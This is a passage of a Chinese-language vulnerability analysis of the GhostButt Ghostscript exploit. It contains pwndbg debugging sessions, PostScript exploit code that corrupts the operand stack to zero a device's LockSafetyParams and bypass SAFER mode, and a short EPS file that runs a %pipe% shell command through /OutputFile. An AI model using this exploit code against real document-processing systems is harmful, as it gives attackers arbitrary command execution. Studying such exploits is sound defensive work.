    0x555557911348: 0x0000000000000000      0x0000000000000000
    0x555557911358: 0xffffffffffffffff      0xffffffffffffffff  // mark bytes
    0x555557911368: 0x0000000000000000      0x0000000000000000
    0x555557911378: 0x0000000000000000      0x0000000000000000
aload操作符执行完毕后，再次检查栈底和栈指针，可以确认均已经指向前面分配的string buffer内存之后了。
    pwndbg> c
    Breakpoint zprint
    pwndbg> p osbot
    $5 = (s_ptr) 0x555557914448       // osbot under 0x0000555557901580!!!
    pwndbg> p osp
    $6 = (s_ptr) 0x555557916178       // osp under 0x0000555557901580!!!
    pwndbg> x/2gx osp
    0x555557916178: 0x0000000b56fc127e      0x00005555572940c3
    pwndbg> p (char *)0x00005555572940c3
    $7 = 0x5555572940c3 "after aload\006?"
## SAFER Bypass
栈指针被重新分配后，便可以利用前述的.eqproc操作符进去上溢了。利用代码中，其分配了一个buffersearchvars
array来保存搜索用变量，循环检查所有buffers里的string字符串末尾的0xff是否被修改，从而判定上溢的栈指针osp到达可控范围，与string
buffer重叠。利用string buffer改写后续入栈的currentdevice对象属性，使之成为一个较大的string，保存至sdevice
array中，再覆盖其LockSafetyParams属性，达到SAFER模式bypass。该利用中分别覆写了内存偏移0x3e8，0x3b0和0x3f0处内容为0(false)，但在我的环境中，0x3b0和0x3f0处内容始终为0，估计是其它版本或系统中LockSafetyParams的偏移有所不同。
    {
        .eqproc
        buffersearchvars 0 buffersearchvars 0 get 1 add put
        buffersearchvars 1 0 put
        buffersearchvars 2 0 put
        buffercount {
            buffers buffersearchvars 1 get get
            buffersizes buffersearchvars 1 get get
            16 sub get
            254 le {    % 0xFF overwritten?
                buffersearchvars 2 1 put      % yes
                buffersearchvars 3 buffers buffersearchvars 1 get get put
                buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put
            } if
            buffersearchvars 1 buffersearchvars 1 get 1 add put
        } repeat
        buffersearchvars 2 get 1 ge {
            exit
        } if
        %(.) print
    } loop
    .eqproc
    .eqproc
    .eqproc
    sdevice 0         % store ref of converted device object
    currentdevice
    (before convert to string type) print
    buffersearchvars 3 get buffersearchvars 4 get 16#7e put         % 0x127e, string type
    buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put
    buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put   % size, 0xffxxxxxx
    (convert done) print
    put
    sdevice 0 get
    16#3e8 0 put      % LockSafetyParams offset
    sdevice 0 get
    16#3b0 0 put      % other version/os offset?
    sdevice 0 get
    16#3f0 0 put      % other version/os offset?
    (LockSafetyParams -> 0) print
话不多说，继续调试器中见真章。
    Breakpoint zprint
    pwndbg> p osp
    $8 = (s_ptr) 0x555557911368  // 栈指针上溢，与string buffer重叠
    pwndbg> x/4gx $8-1
    0x555557911358: 0xffffffffffff1378      0x000055555705a838  // 0xFF 已经被后续入栈的currentdevice覆盖
    0x555557911368: 0x0000001d56fc127e      0x000055555729409e
    pwndbg> p (char *)0x000055555729409e
    $9 = 0x55555729409e "before convert "...
    pwndbg> p r_type((ref *)0x555557911358) == t_device         // 当前依然是device对象
    $10 = 1
    pwndbg> p (gx_device *)0x000055555705a838
    $11 = (gx_device *) 0x55555705a838
    pwndbg> p $11->LockSafetyParams            // 表明处于SAFER模式中
    $12 = 1
    pwndbg> c
    Breakpoint zprint
    pwndbg> x/4gx osp-1
    0x555557911358: 0xffffffffffff127e      0x000055555705a838   // 0x127e 写入
    0x555557911368: 0x0000000c56fc127e      0x000055555729408a
    pwndbg> p r_type((ref *)0x555557911358) == t_string          // 成为string对象
    $13 = 1
    pwndbg> p/x r_size((ref *)0x555557911358)
    $14 = 0xffffffff
    pwndbg> p (char *)0x000055555729408a
    $15 = 0x55555729408a "convert done\261?"
    pwndbg> x/2gx 0x000055555705a838 + 0x3e8
    0x55555705ac20: 0x0000000000000001      0x0000000000000000   // 0x3e8处内存尚未改写
    pwndbg> c
    Breakpoint zprint
    pwndbg> x/2gx osp
    0x555557911338: 0x0000001556fc127e      0x000055555729406d
    pwndbg> p (char *)0x000055555729406d
    $16 = 0x55555729406d "LockSafetyParams -> 0\262?"
    pwndbg> x/2gx 0x000055555705a838 + 0x3e8
    0x55555705ac20: 0x0000000000000000      0x0000000000000000
    pwndbg> p (gx_device *)0x000055555705a838
    $17 = (gx_device *) 0x55555705a838
    pwndbg> p $17->LockSafetyParams     // 改写成功，SAFER bypassed
    $18 = 0
至此，SAFER模式bypass成功，但利用代码还需继续调用aload，重新分配栈空间以免garbage
collect时崩溃，最后通过.putdeviceparams设置好/OutputFile为(%pipe%echo vulnerable >
/dev/tty)字符串，并调用.outputpage飞向光明之巅！
## 后记
GhostButt利用一个type混淆漏洞，及operand
stack栈指针再分配指向可控内存，从而转化成栈指针上溢，使其可以混淆device对象为一个字符串，最终覆盖device的LockSafetyParams属性，达到SAFER模式bypass。其利用可以认为是TK教主的点穴大法，或者说yuange的DVE攻击。不到100行的postscript利用代码，精彩漂亮！而aload操作符的问题并没有被修补，配合其它漏洞，依然可以使用该方法进行利用。
许久没写文章，疏漏在所难免，欢迎到微博联系指正。[@binjo_](http://weibo.com/binjo8)
欢迎转发分享，或者打赏一杯咖啡钱。[二维码](https://images.seebug.org/1496117701549) :)
## 禅(xian)定(zhe)时刻
不指定-dSAFER模式下，device->LockSafetyParams默认是false，9.21版本下依然可以执行%pipe%管道命令，可是最新版本Ghostscript却不行了，这是为啥呢？
    $ cat /root/test.eps
    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: -0 -0 100 100
    currentdevice null false mark /OutputFile (%pipe%echo vulnerable > /dev/tty)
    .putdeviceparams
    1 true .outputpage
    0 0 .quit
    $ ./debugbin/gs -q -dNOPAUSE -sDEVICE=ppmraw -sOutputFile=/dev/null -f /root/test.eps
    vulnerable
    $ cd /root/repos/ghostpdl
    $ git log -1
    commit 3ded6c3b28a1b183a492ada2f2a3970953f3d060
    Author: Henry Stiles 
    Date:   Sun May 28 21:27:41 2017 -0600
        Increment the PJL stream pointer for illegal characters.
        When an illegal character is encountered within a PJL command we exit
        with end of job.  With recent changes it is necessary to increment the
        stream pointer as well because the PJL interpreter is reinvoked upon
        UEL resulting in an infinite loop.
    $ ./debugbin/gs -q -dNOPAUSE -sDEVICE=ppmraw -sOutputFile=/dev/null -f /root/test.eps
    Error: /undefined in .putdeviceparams
    Operand stack:
       --nostringval--   --nostringval--   false   --nostringval--   OutputFile   (%pipe%echo vulnerable > /dev/tty)
    Execution stack:
       %interp_exit   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--   --nostringval--   --nostringval--   false   1   %stopped_push   1967   1   3   %oparray_pop   1966   1   3   %oparray_pop   --nostringval--   1950   1   3   %oparray_pop   1836   1   3   %oparray_pop   --nostringval--   %errorexec_pop   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--    Dictionary stack:
       --dict:969/1684(ro)(G)--   --dict:0/20(G)--   --dict:82/200(L)--    Current allocation mode is local
    Current file position is 148
    GPL Ghostscript GIT PRERELEASE 9.22: Unrecoverable error, exit code 1
## 参考
1 
2 
3
4 
5 
6 
7 
8
9 
* * *
**欢迎扫描以下二维码赞赏作者（微信）** 
* * *